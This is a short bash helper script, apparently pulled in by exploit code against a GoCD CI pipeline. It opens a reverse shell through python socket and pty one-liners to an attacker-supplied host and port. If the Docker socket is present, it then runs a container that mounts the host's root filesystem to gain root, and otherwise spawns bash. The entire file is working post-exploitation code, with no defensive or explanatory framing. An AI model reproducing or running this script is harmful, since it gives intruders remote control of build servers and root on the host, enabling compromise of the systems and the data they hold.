#!/bin/bash
# Not intended for the audience, this is a helper script that is git cloned by exploit code in the gocd pipeline to setup a reverse_tcp connection.

SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}

LHOST=${LHOST:-"${1}"}
LPORT=${LPORT:-"${2}"}

function reverse_tcp()
{
    [ -e '/usr/bin/python2' ] && /usr/bin/python2 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SCRIPT_DIR}/pop.sh\");s.close()"
    [ -e '/usr/bin/python3' ] && /usr/bin/python3 -c "import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"${LHOST}\", ${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SCRIPT_DIR}/pop.sh\");s.close()"
}

[ ${#LHOST} != 0 ] && [ ${#LPORT} != 0 ] && reverse_tcp

# Spawn docker privesc
if [ -e '/var/run/docker.sock' ]; then
    docker run --rm -v /:/mnt -i -t nighter/givemeroot
else
    /bin/bash
fi
